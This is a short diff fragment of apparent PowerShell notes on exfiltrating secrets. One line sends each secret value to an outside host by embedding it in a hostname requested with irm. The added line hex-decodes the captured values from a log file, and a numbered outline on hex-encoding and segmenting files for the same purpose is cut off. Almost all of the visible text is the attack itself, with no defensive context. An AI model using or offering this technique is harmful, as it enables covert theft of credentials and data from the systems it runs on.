@@ -23,6 +23,10 @@ foreach ($i in $x.PSObject.Properties) {$secret = $i.Value;irm "xregex.$secret.c
 ```
 
 ```
+Convert-hexToAscii (find-secret -FilePath ./logs.txt -XRegex 'xregex')
+```
+
+```
 # 1. Convert File to hex 
 # 2. segment with numbers 
 # 3. 
